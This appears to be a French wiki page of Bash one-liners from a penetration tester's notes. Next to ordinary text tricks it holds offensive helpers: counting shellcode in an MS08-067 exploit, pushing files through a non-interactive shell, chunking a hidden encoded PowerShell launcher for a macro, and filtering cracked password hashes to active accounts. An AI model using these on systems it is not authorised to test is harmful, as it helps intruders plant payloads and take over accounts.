---
title: Bash
permalink: /Bash/
---

# Bash

## Commandes utiles
### Divers

Les commandes suivantes permettent de compter le nombre de caractères dans un shellcode:

``` bash
cat ms_08_067.py| grep "^shellcode" | awk '{print $3}' | cut -d'"' -f2 | sed ':a;N;$!ba;s/\n//g' | wc -c
```

Divisions en CLI

``` bash
v=$(cat tmp | cut -d'"' -f2 | tr -d '\n' | wc -c);echo $((v/4))
```

Faire tourner un outil en boucle sur chaque ligne d'un fichier
```
while read dom; do /opt/testssl.sh/testssl.sh --csv $dom ; done < domains.txt
```

### Sed Magic

Les commandes suivantes générent les commandes à taper pour copier/coller un fichier dans un shell non interactif:

``` bash
cat test | sed -e 's/^/echo /g' | sed -e 's/$/>> file.txt/g'
```

Découper une longue entrée sur plusieurs lignes:
``` bash
cat test | sed 's/.\{70\}/Str = Str + "&"\n/g'
Str = Str + "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACg"
Str = Str + "AWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnA"
[...]
```

### Grep

La commande suivante permet de récupérer les lignes dans cracked.txt qui contiennent un élément de enabled.txt (ex: récupérer les hashs des utilisateurs s'ils sont actifs)

``` bash
fgrep -f enabled.txt cracked.txt 
```
